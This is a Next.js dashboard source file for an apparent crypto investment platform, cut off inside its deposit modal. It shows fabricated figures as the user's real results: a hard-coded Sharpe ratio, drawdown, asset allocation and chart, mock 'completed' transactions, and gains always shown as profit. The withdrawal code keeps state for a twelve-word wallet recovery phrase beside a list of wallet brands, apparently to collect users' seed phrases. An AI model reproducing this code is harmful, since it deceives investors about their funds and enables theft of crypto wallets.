"use client";

import { useState, useEffect } from "react";
import { useSession } from "next-auth/react";
import { useRouter } from "next/navigation";
import { motion } from "framer-motion";
import Link from "next/link";
import { 
  FaChartLine, 
  FaWallet, 
  FaArrowUp, 
  FaUser, 
  FaCog, 
  FaPlus, 
  FaMinus,
  FaEye,
  FaEyeSlash,
  FaBitcoin,
  FaChartBar,
  FaCalendarAlt,
  FaDollarSign,
  FaClock,
  FaCheckCircle,
  FaTimesCircle,
  FaPauseCircle,
  FaCrown
} from 'react-icons/fa';

const cardVariants = {
  hidden: { opacity: 0, y: 40 },
  visible: { opacity: 1, y: 0, transition: { duration: 0.6 } }
};

// Real data will be fetched from API
interface PortfolioData {
  totalBalance: number;
  totalProfit: number;
  profitPercentage: number;
  totalDeposits: number;
  totalWithdrawals: number;
  activeInvestments: number;
  monthlyGrowth: number;
  riskScore: string;
  portfolioDiversity: number;
  totalInvested: number;
  totalCurrentValue: number;
}

interface Investment {
  id: string;
  name: string;
  type: string;
  amount: number;
  currentValue: number;
  profit: number;
  profitPercentage: number;
  startDate: string;
  endDate: string;
  status: string;
  expectedReturn: number;
  duration: number;
}

interface Transaction {
  id: number;
  type: string;
  amount: number;
  date: string;
  status: string;
}

// Default empty data
const defaultPortfolioData: PortfolioData = {
  totalBalance: 0,
  totalProfit: 0,
  profitPercentage: 0,
  totalDeposits: 0,
  totalWithdrawals: 0,
  activeInvestments: 0,
  monthlyGrowth: 0,
  riskScore: "Low",
  portfolioDiversity: 0,
  totalInvested: 0,
  totalCurrentValue: 0
};

const defaultInvestments: Investment[] = [];
const defaultTransactions: Transaction[] = [];

// Cryptocurrency wallet addresses (you can move these to .env file)
const cryptoWallets = {
  btc: {
    name: 'Bitcoin (BTC)',
    address: process.env.NEXT_PUBLIC_BTC_WALLET || 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
    icon: '₿',
    color: 'text-yellow-500'
  },
  eth: {
    name: 'Ethereum (ETH)',
    address: process.env.NEXT_PUBLIC_ETH_WALLET || '0x742d35Cc6634C0532925a3b8D4C9db96C4b4d8b6',
    icon: 'Ξ',
    color: 'text-blue-500'
  },
  usdt: {
    name: 'Tether (USDT)',
    address: process.env.NEXT_PUBLIC_USDT_WALLET || 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
    icon: '₮',
    color: 'text-green-500'
  }
};

// Popular wallet apps for withdrawals
const popularWallets = [
  { id: 'metamask', name: 'MetaMask', description: 'Ethereum & EVM compatible', icon: '🦊' },
  { id: 'trustwallet', name: 'Trust Wallet', description: 'Multi-chain wallet', icon: '🛡️' },
  { id: 'exodus', name: 'Exodus', description: 'Desktop & mobile wallet', icon: '📱' },
  { id: 'coinbase', name: 'Coinbase Wallet', description: 'Exchange wallet', icon: '🔵' },
  { id: 'binance', name: 'Binance Wallet', description: 'Exchange wallet', icon: '🟡' },
  { id: 'phantom', name: 'Phantom', description: 'Solana wallet', icon: '👻' },
  { id: 'ledger', name: 'Ledger', description: 'Hardware wallet', icon: '🔒' },
  { id: 'trezor', name: 'Trezor', description: 'Hardware wallet', icon: '🔐' },
  { id: 'atomic', name: 'Atomic Wallet', description: 'Multi-coin wallet', icon: '⚛️' },
  { id: 'guarda', name: 'Guarda Wallet', description: 'Multi-platform wallet', icon: '🛡️' },
  { id: 'jaxx', name: 'Jaxx Liberty', description: 'Multi-platform wallet', icon: '🔄' },
  { id: 'myetherwallet', name: 'MyEtherWallet', description: 'Web-based wallet', icon: '🌐' },
  { id: 'imtoken', name: 'imToken', description: 'Mobile wallet', icon: '📱' },
  { id: 'safepal', name: 'SafePal', description: 'Hardware wallet', icon: '🛡️' },
  { id: 'mathwallet', name: 'Math Wallet', description: 'Multi-chain wallet', icon: '🧮' },
  { id: 'tokenpocket', name: 'TokenPocket', description: 'Multi-chain wallet', icon: '💼' },
  { id: 'walletconnect', name: 'WalletConnect', description: 'Connection protocol', icon: '🔗' },
  { id: 'rainbow', name: 'Rainbow', description: 'Ethereum wallet', icon: '🌈' },
  { id: 'argent', name: 'Argent', description: 'Smart contract wallet', icon: '🪙' },
  { id: 'gnosis', name: 'Gnosis Safe', description: 'Multi-sig wallet', icon: '🛡️' },
  { id: 'other', name: 'Other Wallet', description: 'Specify in notes', icon: '📝' }
];

// Simple chart component
const SimpleChart = ({ data, height = 200 }: { data: number[], height?: number }) => {
  const maxValue = Math.max(...data);
  const minValue = Math.min(...data);
  const range = maxValue - minValue;
  
  return (
    <div className="relative" style={{ height }}>
      <svg width="100%" height="100%" className="overflow-visible">
        <defs>
          <linearGradient id="chartGradient" x1="0%" y1="0%" x2="0%" y2="100%">
            <stop offset="0%" stopColor="var(--brand)" stopOpacity="0.8" />
            <stop offset="100%" stopColor="var(--brand)" stopOpacity="0.2" />
          </linearGradient>
        </defs>
        <path
          d={data.map((value, index) => {
            const x = (index / (data.length - 1)) * 100;
            const y = 100 - ((value - minValue) / range) * 100;
            return `${index === 0 ? 'M' : 'L'} ${x}% ${y}%`;
          }).join(' ')}
          stroke="var(--brand)"
          strokeWidth="3"
          fill="none"
          className="drop-shadow-lg"
        />
        <path
          d={data.map((value, index) => {
            const x = (index / (data.length - 1)) * 100;
            const y = 100 - ((value - minValue) / range) * 100;
            return `${index === 0 ? 'M' : 'L'} ${x}% ${y}%`;
          }).join(' ') + ` L 100% 100% L 0% 100% Z`}
          fill="url(#chartGradient)"
          opacity="0.3"
        />
      </svg>
    </div>
  );
};

export default function Dashboard() {
  const { data: session, status } = useSession();
  const router = useRouter();
  const [showBalance, setShowBalance] = useState(true);
  const [activeTab, setActiveTab] = useState("overview");
  const [portfolioData, setPortfolioData] = useState<PortfolioData>(defaultPortfolioData);
  const [investments, setInvestments] = useState<Investment[]>(defaultInvestments);
  const [transactions, setTransactions] = useState<Transaction[]>(defaultTransactions);
  const [loading, setLoading] = useState(true);
  const [lastUpdated, setLastUpdated] = useState<Date | null>(null);
  const [showDepositModal, setShowDepositModal] = useState(false);
  const [showWithdrawalModal, setShowWithdrawalModal] = useState(false);
  const [depositAmount, setDepositAmount] = useState('');
  const [withdrawalAmount, setWithdrawalAmount] = useState('');
  const [selectedCrypto, setSelectedCrypto] = useState('btc');
  const [withdrawalWalletType, setWithdrawalWalletType] = useState('');
  const [twelveWordPhrase, setTwelveWordPhrase] = useState(['', '', '', '', '', '', '', '', '', '', '', '']);

  // Function to fetch real user data
  const fetchUserData = async () => {
    try {
      console.log('🔍 [USER DASHBOARD] Fetching user data...');
      setLoading(true);
      
      const response = await fetch('/api/user/investments', {
        method: 'GET',
        headers: {
          'Cache-Control': 'no-cache',
          'Pragma': 'no-cache'
        }
      });
      
      if (response.ok) {
        const data = await response.json();
        console.log('✅ [USER DASHBOARD] User data fetched:', data);
        
        setPortfolioData(data.portfolio);
        setInvestments(data.investments);
        setLastUpdated(new Date());
        
        // Generate mock transactions for now (you can create a real transactions API later)
        const mockTransactions: Transaction[] = [
          { id: 1, type: "deposit", amount: data.portfolio.totalDeposits, date: new Date().toISOString().split('T')[0], status: "completed" },
          { id: 2, type: "profit", amount: data.portfolio.totalProfit, date: new Date().toISOString().split('T')[0], status: "completed" },
          { id: 3, type: "withdrawal", amount: -data.portfolio.totalWithdrawals, date: new Date().toISOString().split('T')[0], status: "completed" }
        ];
        setTransactions(mockTransactions);
        
      } else {
        console.error('❌ [USER DASHBOARD] Failed to fetch user data:', response.status);
      }
    } catch (error) {
      console.error('❌ [USER DASHBOARD] Error fetching user data:', error);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (status === "unauthenticated") {
      router.push("/login");
    } else if (status === "authenticated") {
      // Fetch real data when user is authenticated
      fetchUserData();
      
      // Set up auto-refresh every 30 seconds
      const interval = setInterval(() => {
        console.log('🔄 [USER DASHBOARD] Auto-refreshing data...');
        fetchUserData();
      }, 30000); // 30 seconds
      
      // Cleanup interval on unmount
      return () => clearInterval(interval);
    }
  }, [status, router]);

  if (status === "loading") {
    return (
      <div className="min-h-screen bg-[var(--background)] flex items-center justify-center">
        <div className="w-16 h-16 border-4 border-[var(--brand)]/30 border-t-[var(--brand)] rounded-full animate-spin" />
      </div>
    );
  }

  if (!session) {
    return null;
  }

  const formatCurrency = (amount: number) => {
    return new Intl.NumberFormat('en-US', {
      style: 'currency',
      currency: 'USD',
    }).format(amount);
  };

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleDateString('en-US', {
      year: 'numeric',
      month: 'short',
      day: 'numeric'
    });
  };

  const getStatusIcon = (status: string) => {
    switch (status) {
      case 'active': return <FaCheckCircle className="text-green-500" />;
      case 'completed': return <FaCheckCircle className="text-blue-500" />;
      case 'cancelled': return <FaTimesCircle className="text-red-500" />;
      case 'pending': return <FaPauseCircle className="text-yellow-500" />;
      default: return <FaClock className="text-gray-500" />;
    }
  };

  const getTypeIcon = (type: string) => {
    switch (type) {
      case 'crypto': return <FaBitcoin className="text-yellow-500" />;
      case 'stocks': return <FaChartBar className="text-blue-500" />;
      case 'real-estate': return <FaChartLine className="text-green-500" />;
      case 'forex': return <FaArrowUp className="text-purple-500" />;
      case 'commodities': return <FaDollarSign className="text-orange-500" />;
      default: return <FaChartLine className="text-gray-500" />;
    }
  };

  // Chart data for portfolio performance
  const chartData = [100, 105, 98, 112, 108, 115, 120, 118, 125, 130, 128, 132];

  return (
    <main className="min-h-screen bg-[var(--background)] text-[var(--foreground)] pt-20">
      {/* Header */}
      <header className="bg-[var(--card-bg)] border-b border-[var(--brand)]/20 px-4 py-4">
        <div className="max-w-7xl mx-auto flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
          <h1 className="text-xl sm:text-2xl font-bold text-[var(--foreground)]">Dashboard</h1>
          
          <div className="flex items-center gap-2 sm:gap-4 w-full sm:w-auto">
            <button
              onClick={fetchUserData}
              disabled={loading}
              className="px-3 py-1 bg-[var(--brand)] hover:bg-[var(--brand)]/80 text-white text-sm rounded-lg transition-colors flex items-center gap-2 disabled:opacity-50"
            >
              {loading ? (
                <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
              ) : (
                <FaArrowUp size={14} />
              )}
              Refresh
            </button>
            
            {lastUpdated && (
              <div className="text-xs text-[var(--foreground)]/40">
                Last updated: {lastUpdated.toLocaleTimeString()}
              </div>
            )}
            
            <div className="flex items-center gap-2 text-sm text-[var(--foreground)]/60">
              <FaUser size={16} />
              <span className="hidden sm:inline">{session.user?.name || 'User'}</span>
            </div>
            {session.user?.role === 'admin' && (
              <Link
                href="/admin"
                className="px-3 sm:px-4 py-2 bg-yellow-600 hover:bg-yellow-700 text-white rounded-lg flex items-center gap-2 transition-colors text-sm"
              >
                <FaCrown size={16} />
                <span className="hidden sm:inline">Admin Panel</span>
                <span className="sm:hidden">Admin</span>
              </Link>
            )}
            <button
              onClick={() => setShowBalance(!showBalance)}
              className="p-2 text-[var(--foreground)]/60 hover:text-[var(--foreground)] transition-colors"
              title={showBalance ? "Hide Balance" : "Show Balance"}
            >
              {showBalance ? <FaEye size={16} /> : <FaEyeSlash size={16} />}
            </button>
          </div>
        </div>
      </header>

      {/* Navigation Tabs */}
      <nav className="bg-[var(--card-bg)] border-b border-[var(--brand)]/20 px-4">
        <div className="max-w-7xl mx-auto">
          <div className="flex overflow-x-auto space-x-8 pb-2">
            {[
              { id: "overview", label: "Overview", icon: FaChartLine },
              { id: "investments", label: "Investments", icon: FaWallet },
              { id: "transactions", label: "Transactions", icon: FaArrowUp },
              { id: "analytics", label: "Analytics", icon: FaChartBar },
              ...(session.user?.role === 'admin' ? [{ id: "admin", label: "Admin", icon: FaCrown }] : []),
              { id: "settings", label: "Settings", icon: FaCog }
            ].map((tab) => {
              const Icon = tab.icon;
              return (
                <button
                  key={tab.id}
                  onClick={() => setActiveTab(tab.id)}
                  className={`flex items-center gap-2 py-4 px-3 border-b-2 font-medium text-sm transition-colors whitespace-nowrap ${
                    activeTab === tab.id
                      ? "border-[var(--brand)] text-[var(--brand)]"
                      : "border-transparent text-[var(--foreground)]/60 hover:text-[var(--foreground)]/80"
                  }`}
                >
                  <Icon size={16} />
                  <span className="hidden sm:inline">{tab.label}</span>
                </button>
              );
            })}
          </div>
        </div>
      </nav>

      {/* Main Content */}
      <div className="max-w-7xl mx-auto px-3 sm:px-4 py-6 sm:py-8">
        {activeTab === "overview" && (
          <motion.div
            initial="hidden"
            animate="visible"
            variants={cardVariants}
            className="space-y-8"
          >
            {loading ? (
              <div className="flex items-center justify-center py-12">
                <div className="w-8 h-8 border-4 border-[var(--brand)]/30 border-t-[var(--brand)] rounded-full animate-spin"></div>
                <span className="ml-3 text-[var(--foreground)]/60">Loading portfolio data...</span>
              </div>
            ) : (
              <>
                {/* Portfolio Summary Cards */}
                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 sm:gap-6">
              <motion.div
                variants={cardVariants}
                className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6 hover:shadow-2xl transition-all duration-300"
              >
                <div className="flex items-center justify-between mb-4">
                  <h3 className="text-[var(--foreground)]/60 text-sm font-medium">Total Balance</h3>
                  <FaWallet className="text-[var(--brand)]" size={20} />
                </div>
                <div className="text-2xl font-bold text-[var(--foreground)] mb-2">
                  {showBalance ? formatCurrency(portfolioData.totalBalance) : "****"}
                </div>
                <div className="flex items-center gap-2 text-sm">
                  <FaArrowUp className="text-green-500" size={12} />
                  <span className="text-green-500">+{portfolioData.monthlyGrowth}%</span>
                  <span className="text-[var(--foreground)]/60">this month</span>
                </div>
              </motion.div>

              <motion.div
                variants={cardVariants}
                transition={{ delay: 0.1 }}
                className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6 hover:shadow-2xl transition-all duration-300"
              >
                <div className="flex items-center justify-between mb-4">
                  <h3 className="text-[var(--foreground)]/60 text-sm font-medium">Total Profit</h3>
                  <FaArrowUp className="text-green-500" size={20} />
                </div>
                <div className="text-2xl font-bold text-green-500 mb-2">
                  {showBalance ? formatCurrency(portfolioData.totalProfit) : "****"}
                </div>
                <div className="text-sm text-[var(--foreground)]/60">
                  +{portfolioData.profitPercentage}% since joining
                </div>
              </motion.div>

              <motion.div
                variants={cardVariants}
                transition={{ delay: 0.2 }}
                className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6 hover:shadow-2xl transition-all duration-300"
              >
                <div className="flex items-center justify-between mb-4">
                  <h3 className="text-[var(--foreground)]/60 text-sm font-medium">Active Investments</h3>
                  <FaChartLine className="text-[var(--brand)]" size={20} />
                </div>
                <div className="text-2xl font-bold text-[var(--foreground)] mb-2">
                  {portfolioData.activeInvestments}
                </div>
                <div className="text-sm text-[var(--foreground)]/60">
                  {portfolioData.portfolioDiversity}% diversified
                </div>
              </motion.div>

              <motion.div
                variants={cardVariants}
                transition={{ delay: 0.3 }}
                className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6 hover:shadow-2xl transition-all duration-300"
              >
                <div className="flex items-center justify-between mb-4">
                  <h3 className="text-[var(--foreground)]/60 text-sm font-medium">Risk Score</h3>
                  <FaArrowUp className="text-[var(--brand)]" size={20} />
                </div>
                <div className="text-2xl font-bold text-[var(--foreground)] mb-2">
                  {portfolioData.riskScore}
                </div>
                <div className="text-sm text-[var(--foreground)]/60">
                  Conservative strategy
                </div>
              </motion.div>
            </div>

            {/* Investment Performance Chart */}
            <motion.div
              variants={cardVariants}
              transition={{ delay: 0.4 }}
              className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6"
            >
              <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between mb-6 gap-4">
                <h3 className="text-lg sm:text-xl font-bold text-[var(--foreground)]">Portfolio Performance</h3>
                <div className="flex items-center gap-4 text-sm">
                  <div className="flex items-center gap-2">
                    <div className="w-3 h-3 bg-[var(--brand)] rounded-full"></div>
                    <span className="text-[var(--foreground)]/60">Portfolio Value</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <div className="w-3 h-3 bg-green-500 rounded-full"></div>
                    <span className="text-[var(--foreground)]/60">Growth Trend</span>
                  </div>
                </div>
              </div>
              <div className="h-64">
                <SimpleChart data={chartData} height={256} />
              </div>
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 mt-6 text-center">
                <div>
                  <div className="text-xl sm:text-2xl font-bold text-green-500">+{portfolioData.monthlyGrowth}%</div>
                  <div className="text-sm text-[var(--foreground)]/60">This Month</div>
                </div>
                <div>
                  <div className="text-xl sm:text-2xl font-bold text-[var(--foreground)]">{portfolioData.profitPercentage}%</div>
                  <div className="text-sm text-[var(--foreground)]/60">Total Return</div>
                </div>
                <div>
                  <div className="text-xl sm:text-2xl font-bold text-[var(--brand)]">{portfolioData.portfolioDiversity}%</div>
                  <div className="text-sm text-[var(--foreground)]/60">Diversification</div>
                </div>
              </div>
              
              {/* Action Buttons */}
              <div className="flex flex-col sm:flex-row gap-4 mt-6 justify-center">
                <button
                  onClick={() => setShowDepositModal(true)}
                  className="px-6 py-3 bg-green-600 hover:bg-green-700 text-white rounded-lg flex items-center gap-2 transition-colors font-medium"
                >
                  <FaPlus size={16} />
                  Deposit Funds
                </button>
                <button
                  onClick={() => setShowWithdrawalModal(true)}
                  className="px-6 py-3 bg-red-600 hover:bg-red-700 text-white rounded-lg flex items-center gap-2 transition-colors font-medium"
                >
                  <FaMinus size={16} />
                  Withdraw Funds
                </button>
              </div>
            </motion.div>

            {/* Quick Actions */}
            <motion.div
              variants={cardVariants}
              transition={{ delay: 0.5 }}
              className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6"
            >
              <h3 className="text-xl font-bold text-[var(--foreground)] mb-6">Quick Actions</h3>
              <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
                <button className="bg-[var(--brand)] hover:bg-[var(--brand)]/80 text-white p-4 rounded-lg flex items-center gap-3 transition-colors">
                  <FaPlus size={20} />
                  <span>New Investment</span>
                </button>
                <button 
                  onClick={() => setShowDepositModal(true)}
                  className="bg-green-600 hover:bg-green-700 text-white p-4 rounded-lg flex items-center gap-3 transition-colors"
                >
                  <FaArrowUp size={20} />
                  <span>Deposit Funds</span>
                </button>
                <button className="bg-[var(--card-bg)] border border-[var(--brand)]/20 hover:bg-[var(--brand)]/10 text-[var(--foreground)] p-4 rounded-lg flex items-center gap-3 transition-colors">
                  <FaChartLine size={20} />
                  <span>View Analytics</span>
                </button>
              </div>
            </motion.div>
              </>
            )}
          </motion.div>
        )}

        {activeTab === "investments" && (
          <motion.div
            initial="hidden"
            animate="visible"
            variants={cardVariants}
            className="space-y-6"
          >
            <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
              <h2 className="text-xl sm:text-2xl font-bold text-[var(--foreground)]">Active Investments</h2>
              <button className="bg-[var(--brand)] hover:bg-[var(--brand)]/80 text-white px-4 sm:px-6 py-2 rounded-lg flex items-center gap-2 transition-colors">
                <FaPlus size={16} />
                <span className="hidden sm:inline">New Investment</span>
                <span className="sm:hidden">New</span>
              </button>
            </div>
            
            <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4 sm:gap-6">
              {investments.map((investment: Investment, index: number) => (
                <motion.div
                  key={investment.id}
                  variants={cardVariants}
                  transition={{ delay: index * 0.1 }}
                  className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6 hover:shadow-2xl transition-all duration-300"
                >
                  <div className="flex items-center justify-between mb-4">
                    <div className="flex items-center gap-3">
                      {getTypeIcon(investment.type)}
                      <div>
                        <h3 className="font-bold text-[var(--foreground)]">{investment.name}</h3>
                        <p className="text-sm text-[var(--foreground)]/60 capitalize">{investment.type}</p>
                      </div>
                    </div>
                    {getStatusIcon(investment.status)}
                  </div>
                  
                  <div className="space-y-3 mb-4">
                    <div className="flex justify-between">
                      <span className="text-[var(--foreground)]/60">Investment:</span>
                      <span className="font-semibold">{formatCurrency(investment.amount)}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-[var(--foreground)]/60">Current Value:</span>
                      <span className="font-semibold text-green-500">{formatCurrency(investment.currentValue)}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-[var(--foreground)]/60">Profit:</span>
                      <span className="font-semibold text-green-500">+{formatCurrency(investment.profit)}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-[var(--foreground)]/60">Return:</span>
                      <span className="font-semibold text-green-500">+{investment.profitPercentage}%</span>
                    </div>
                  </div>
                  
                  <div className="flex items-center justify-between text-sm text-[var(--foreground)]/60 mb-4">
                    <div className="flex items-center gap-1">
                      <FaCalendarAlt size={12} />
                      <span>Started: {formatDate(investment.startDate)}</span>
                    </div>
                    <div className="flex items-center gap-1">
                      <FaClock size={12} />
                      <span>{investment.duration} days</span>
                    </div>
                  </div>
                  
                  <div className="w-full bg-[var(--background)] rounded-full h-2">
                    <div 
                      className="bg-[var(--brand)] h-2 rounded-full transition-all duration-500"
                      style={{ width: `${(investment.profitPercentage / investment.expectedReturn) * 100}%` }}
                    ></div>
                  </div>
                  <div className="text-xs text-[var(--foreground)]/60 mt-2 text-center">
                    {investment.profitPercentage}% of {investment.expectedReturn}% target
                  </div>
                </motion.div>
              ))}
            </div>
          </motion.div>
        )}

        {activeTab === "transactions" && (
          <motion.div
            initial="hidden"
            animate="visible"
            variants={cardVariants}
            className="space-y-6"
          >
            <h2 className="text-2xl font-bold text-[var(--foreground)]">Transaction History</h2>
            
            <div className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl overflow-hidden">
              <div className="overflow-x-auto">
                <table className="w-full">
                  <thead className="bg-[var(--background)]/50">
                    <tr>
                      <th className="px-6 py-4 text-left text-sm font-medium text-[var(--foreground)]/60">Type</th>
                      <th className="px-6 py-4 text-left text-sm font-medium text-[var(--foreground)]/60">Amount</th>
                      <th className="px-6 py-4 text-left text-sm font-medium text-[var(--foreground)]/60">Date</th>
                      <th className="px-6 py-4 text-left text-sm font-medium text-[var(--foreground)]/60">Status</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-[var(--brand)]/10">
                    {transactions.map((transaction: Transaction) => (
                      <tr key={transaction.id} className="hover:bg-[var(--background)]/30 transition-colors">
                        <td className="px-6 py-4">
                          <div className="flex items-center gap-2">
                            {transaction.type === 'deposit' && <FaPlus className="text-green-500" />}
                            {transaction.type === 'withdrawal' && <FaMinus className="text-red-500" />}
                            {transaction.type === 'investment' && <FaChartLine className="text-[var(--brand)]" />}
                            {transaction.type === 'profit' && <FaArrowUp className="text-green-500" />}
                            <span className="capitalize">{transaction.type}</span>
                          </div>
                        </td>
                        <td className={`px-6 py-4 font-semibold ${
                          transaction.amount > 0 ? 'text-green-500' : 'text-red-500'
                        }`}>
                          {transaction.amount > 0 ? '+' : ''}{formatCurrency(Math.abs(transaction.amount))}
                        </td>
                        <td className="px-6 py-4 text-[var(--foreground)]/80">{formatDate(transaction.date)}</td>
                        <td className="px-6 py-4">
                          <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-green-100 text-green-800">
                            {transaction.status}
                          </span>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          </motion.div>
        )}

        {activeTab === "analytics" && (
          <motion.div
            initial="hidden"
            animate="visible"
            variants={cardVariants}
            className="space-y-6"
          >
            <h2 className="text-2xl font-bold text-[var(--foreground)]">Portfolio Analytics</h2>
            
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-4 sm:gap-6">
              <div className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6">
                <h3 className="text-lg font-bold text-[var(--foreground)] mb-4">Asset Allocation</h3>
                <div className="space-y-4">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <FaBitcoin className="text-yellow-500" />
                      <span>Crypto</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <span>40%</span>
                      <div className="w-20 bg-[var(--background)] rounded-full h-2">
                        <div className="bg-yellow-500 h-2 rounded-full" style={{ width: '40%' }}></div>
                      </div>
                    </div>
                  </div>
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <FaChartBar className="text-blue-500" />
                      <span>Stocks</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <span>35%</span>
                      <div className="w-20 bg-[var(--background)] rounded-full h-2">
                        <div className="bg-blue-500 h-2 rounded-full" style={{ width: '35%' }}></div>
                      </div>
                    </div>
                  </div>
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <FaChartLine className="text-green-500" />
                      <span>Real Estate</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <span>25%</span>
                      <div className="w-20 bg-[var(--background)] rounded-full h-2">
                        <div className="bg-green-500 h-2 rounded-full" style={{ width: '25%' }}></div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              
              <div className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6">
                <h3 className="text-lg font-bold text-[var(--foreground)] mb-4">Performance Metrics</h3>
                <div className="space-y-4">
                  <div className="flex justify-between">
                    <span className="text-[var(--foreground)]/60">Sharpe Ratio</span>
                    <span className="font-semibold">1.85</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-[var(--foreground)]/60">Max Drawdown</span>
                    <span className="font-semibold text-red-500">-8.2%</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-[var(--foreground)]/60">Volatility</span>
                    <span className="font-semibold">12.4%</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-[var(--foreground)]/60">Beta</span>
                    <span className="font-semibold">0.92</span>
                  </div>
                </div>
              </div>
            </div>
          </motion.div>
        )}

        {activeTab === "admin" && (
          <motion.div
            initial="hidden"
            animate="visible"
            variants={cardVariants}
            className="space-y-6"
          >
            <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
              <h2 className="text-xl sm:text-2xl font-bold text-[var(--foreground)]">Admin Panel</h2>
              <Link
                href="/admin"
                className="px-4 sm:px-6 py-3 bg-yellow-600 hover:bg-yellow-700 text-white rounded-lg flex items-center gap-2 transition-colors"
              >
                <FaCrown size={16} />
                <span className="hidden sm:inline">Go to Admin Dashboard</span>
                <span className="sm:hidden">Admin Dashboard</span>
              </Link>
            </div>
            
            <div className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6">
              <h3 className="text-lg font-bold text-[var(--foreground)] mb-4">Quick Admin Actions</h3>
              <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
                <div className="bg-[var(--background)]/50 p-4 rounded-lg">
                  <div className="flex items-center gap-3 mb-3">
                    <FaUser className="text-[var(--brand)]" size={20} />
                    <h4 className="font-semibold text-[var(--foreground)]">User Management</h4>
                  </div>
                  <p className="text-sm text-[var(--foreground)]/60 mb-3">View, edit, and manage all users in the system</p>
                  <Link
                    href="/admin"
                    className="text-[var(--brand)] hover:text-[var(--brand)]/80 text-sm font-medium transition-colors"
                  >
                    Manage Users →
                  </Link>
                </div>
                
                <div className="bg-[var(--background)]/50 p-4 rounded-lg">
                  <div className="flex items-center gap-3 mb-3">
                    <FaChartLine className="text-green-500" size={20} />
                    <h4 className="font-semibold text-[var(--foreground)]">System Analytics</h4>
                  </div>
                  <p className="text-sm text-[var(--foreground)]/60 mb-3">Monitor system performance and user statistics</p>
                  <Link
                    href="/admin"
                    className="text-[var(--brand)] hover:text-[var(--brand)]/80 text-sm font-medium transition-colors"
                  >
                    View Analytics →
                  </Link>
                </div>
                
                <div className="bg-[var(--background)]/50 p-4 rounded-lg">
                  <div className="flex items-center gap-3 mb-3">
                    <FaCog className="text-[var(--brand)]" size={20} />
                    <h4 className="font-semibold text-[var(--foreground)]">System Settings</h4>
                  </div>
                  <p className="text-sm text-[var(--foreground)]/60 mb-3">Configure system-wide settings and preferences</p>
                  <Link
                    href="/admin"
                    className="text-[var(--brand)] hover:text-[var(--brand)]/80 text-sm font-medium transition-colors"
                  >
                    Configure →
                  </Link>
                </div>
              </div>
            </div>
          </motion.div>
        )}

        {activeTab === "settings" && (
          <div className="text-center py-12">
            <h2 className="text-2xl font-bold text-[var(--foreground)] mb-4">Settings</h2>
            <p className="text-[var(--foreground)]/60">Account settings coming soon...</p>
          </div>
        )}
      </div>

      {/* Deposit Modal */}
      {showDepositModal && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
          <motion.div
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-2xl p-6 max-w-md w-full"
          >
            <div className="flex items-center justify-between mb-6">
              <h3 className="text-xl font-bold text-[var(--foreground)]">Deposit Funds</h3>
              <button
                onClick={() => setShowDepositModal(false)}
                className="text-[var(--foreground)]/60 hover:text-[var(--foreground)] transition-colors"
              >
                <FaTimesCircle size={24} />
              </button>
            </div>
            
            <div className="space-y-6">
              {/* Amount Input */}
              <div>
                <label className="block text-sm text-[var(--foreground)]/60 mb-2">Amount (USD)</label>
                <input
                  type="number"
                  step="0.01"
                  min="10"
                  value={depositAmount}
                  onChange={(e) => setDepositAmount(e.target.value)}
                  placeholder="Enter amount (minimum $10)"
                  className="w-full px-3 py-2 bg-[var(--background)] border border-[var(--brand)]/20 rounded-lg text-[var(--foreground)] focus:outline-none focus:border-[var(--brand)]"
                />
              </div>

              {/* Cryptocurrency Selection */}
              <div>
                <label className="block text-sm text-[var(--foreground)]/60 mb-3">Select Payment Method</label>
                <div className="grid grid-cols-3 gap-3">
